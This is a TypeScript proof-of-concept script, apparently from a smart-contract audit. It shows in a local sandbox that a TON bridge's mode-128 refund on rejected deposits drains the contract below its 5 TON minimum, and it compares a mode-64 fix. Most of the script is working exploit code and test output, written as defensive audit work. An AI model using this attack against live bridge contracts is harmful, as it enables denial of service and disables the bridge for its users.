// PoC for Finding #5: TON Bridge Mode 128 Griefing/DoS
// Uses @ton-community/sandbox low-level blockchain API directly

import { Blockchain } from '@ton-community/sandbox';
import { beginCell, Cell, contractAddress, Address, toNano } from 'ton-core';
import { compileFunc } from '@ton-community/func-js';
import * as fs from 'fs';
import * as path from 'path';

const MIN_BALANCE = 5_000_000_000n; // 5 TON in nanotons
const INITIAL_TON = 50n; // 50 TON for initial deposit

async function main() {
    console.log('=== TON Bridge Mode 128 Griefing PoC ===');
    console.log('(Finding #5: TON Bridge Mode 128 Griefing/DoS)\n');

    // Step 1: Read and compile the contract
    console.log('Step 1: Reading contract source...');
    const contractPath = path.resolve(__dirname, '..', 'contracts', 'min_bridge.fc');
    const source = fs.readFileSync(contractPath, 'utf8');
    console.log('✅ Contract source loaded\n');

    console.log('Step 2: Compiling with func-js...');
    const compileResult = await compileFunc({
        targets: [contractPath],
        sources: {
            [contractPath]: source
        }
    });

    if (compileResult.status !== 'ok') {
        console.error('❌ Compilation failed:', compileResult.message);
        process.exit(1);
    }

    const codeCell = Cell.fromBase64(compileResult.codeBoc);
    const dataCell = beginCell().endCell();
    const initState = { code: codeCell, data: dataCell };
    const addr = contractAddress(0, initState);
    console.log('✅ Contract compiled\n');

    // Step 3: Create blockchain and deployer
    console.log('Step 3: Setting up blockchain...');
    const blockchain = await Blockchain.create();
    const deployer = await blockchain.treasury('deployer');
    const attacker = await blockchain.treasury('attacker');
    console.log('✅ Blockchain ready\n');

    // Step 4: Deploy vulnerable contract
    console.log('Step 4: Deploying vulnerable bridge contract...');
    await blockchain.setShardAccount(addr, {
        address: addr,
        accountStorage: {
            stateInit: initState,
            balance: { coins: toNano(INITIAL_TON.toString()) }
        },
        lastTransactionHash: Buffer.alloc(32, 0),
        lastTransactionLt: 0n,
        initCodeHash: codeCell.hash(),
        storageStat: { cellsCount: 0, bitsCount: 0, publicCellsCount: 0 }
    });
    console.log(`   Bridge address: ${addr.toRawString()}`);
    console.log(`   Initial balance: ${INITIAL_TON} TON\n`);

    // Step 5: TEST VULNERABLE MODE 128
    console.log('Step 5: TESTING VULNERABILITY (MODE 128)...');
    
    // Create a message to trigger deposit rejection (op=1) with mode 128
    const vulnBody = beginCell()
        .storeUint(1, 32)      // op = 0x01 = deposit reject (mode 128)
        .storeCoins(toNano('10')) // 10 TON worth of jettons being rejected
        .storeRef(beginCell().endCell())
        .endCell();

    const vulnResult = await blockchain.sendMessage({
        info: {
            type: 'internal',
            ihrDisabled: true,
            bounce: true,
            bounced: false,
            src: deployer.address,
            dest: addr,
            value: { coins: toNano('1') }, // 1 TON for gas
            ihrFee: 0n,
            fwdFee: 0n,
            createdLt: 0n,
            createdAt: 0
        },
        init: undefined,
        body: vulnBody,
    });

    console.log('   Attack message sent (mode 128)...');
    
    // Check balance after attack - get it from the blockchain state
    const balanceAfterVuln = await blockchain.getBalance(addr);
    const balanceNumTon = Number(balanceAfterVuln) / 1e9;
    const isBelowMin = balanceAfterVuln < MIN_BALANCE;

    console.log(`   Balance after attack: ${balanceNumTon.toFixed(4)} TON`);
    console.log(`   Below min (5 TON)? ${isBelowMin ? 'YES ❌' : 'NO ✅'}`);
    console.log(`   Result: ${isBelowMin ? 'VULNERABLE - DoS ACHIEVED! ❌❌❌' : 'Safe ✅'}\n`);

    // Step 6: Send a simulated "refill" by deploying again and testing FIXED mode 64
    console.log('Step 6: COMPARING WITH FIXED MODE 64...');
    
    // Create a new contract address for the fixed version test
    const dataCellFixed = beginCell().endCell();
    const initFixed = { code: codeCell, data: dataCellFixed };
    const addrFixed = contractAddress(0, initFixed);
    
    await blockchain.setShardAccount(addrFixed, {
        address: addrFixed,
        accountStorage: {
            stateInit: initFixed,
            balance: { coins: toNano(INITIAL_TON.toString()) }
        },
        lastTransactionHash: Buffer.alloc(32, 0),
        lastTransactionLt: 0n,
        initCodeHash: codeCell.hash(),
        storageStat: { cellsCount: 0, bitsCount: 0, publicCellsCount: 0 }
    });
    console.log(`   Deployed fixed instance with ${INITIAL_TON} TON\n`);

    // Send fixed mode (op=3 = mode 64 safe)
    const fixedBody = beginCell()
        .storeUint(3, 32)      // op = 0x03 = fixed mode 64
        .storeRef(beginCell().endCell())
        .endCell();

    const fixedResult = await blockchain.sendMessage({
        info: {
            type: 'internal',
            ihrDisabled: true,
            bounce: true,
            bounced: false,
            src: deployer.address,
            dest: addrFixed,
            value: { coins: toNano('1') },
            ihrFee: 0n,
            fwdFee: 0n,
            createdLt: 0n,
            createdAt: 0
        },
        init: undefined,
        body: fixedBody,
    });

    console.log('   Fixed mode message sent (mode 64)...');
    
    const balanceAfterFixed = await blockchain.getBalance(addrFixed);
    const balanceFixedNum = Number(balanceAfterFixed) / 1e9;
    const fixedPreserved = balanceAfterFixed > MIN_BALANCE;

    console.log(`   Balance after fixed mode: ${balanceFixedNum.toFixed(4)} TON`);
    console.log(`   Balance preserved? ${fixedPreserved ? 'YES ✅' : 'NO ❌'}\n`);

    // RESULTS
    console.log('========================================');
    console.log('RESULTS SUMMARY');
    console.log('========================================');
    console.log(`| Metric              | mode 128 (VULN)  | mode 64 (FIXED)  |`);
    console.log(`|---------------------|------------------|-------------------|`);
    console.log(`| Initial             | 50.0000 TON      | 50.0000 TON       |`);
    console.log(`| Final               | ${balanceNumTon.toFixed(4).padStart(13)} TON  | ${balanceFixedNum.toFixed(4).padStart(13)} TON   |`);
    console.log(`| Below 5 TON min?    | ${String(isBelowMin ? 'YES ❌' : 'NO ✅').padEnd(15)} | ${String(!fixedPreserved ? 'YES ❌' : 'NO ✅').padEnd(17)} |`);
    console.log(`| DoS possible?       | ${String(isBelowMin ? 'YES ❌' : 'NO ✅').padEnd(15)} | ${String(!fixedPreserved ? 'YES ❌' : 'NO ✅').padEnd(17)} |`);
    console.log('========================================\n');

    if (isBelowMin) {
        console.log('❌❌❌ VULNERABILITY CONFIRMED: mode 128 drains bridge balance below minimum!');
        console.log('   The TON Bridge is vulnerable to Griefing/DoS attacks.');
        console.log('   Just ONE rejected deposit disables the bridge.\n');
        console.log('RECOMMENDED FIX:');
        console.log('   Change mode 128 to mode 64 in return_jettons_to_sender_and_refund_gas()');
        console.log('   in ton-deposit/contracts/imports/jetton_utils.fc, line 49\n');
    } else {
        console.log('⚠️  Balance preserved. Check if reserve mechanism prevented the drain.\n');
    }

    // Print exit codes for test automation
    if (isBelowMin) {
        console.log('[PASS] mode 128 drains balance - vulnerability confirmed ✅');
    } else {
        console.log('[FAIL] mode 128 did NOT drain balance - possible protection ⚠️');
    }
    if (fixedPreserved) {
        console.log('[PASS] mode 64 preserves balance - fix works correctly ✅');
    } else {
        console.log('[FAIL] mode 64 drained balance too - unexpected ⚠️');
    }

    process.exit(isBelowMin ? 0 : 1);
}

main().catch(err => {
    console.error('Fatal error:', err);
    process.exit(2);
});
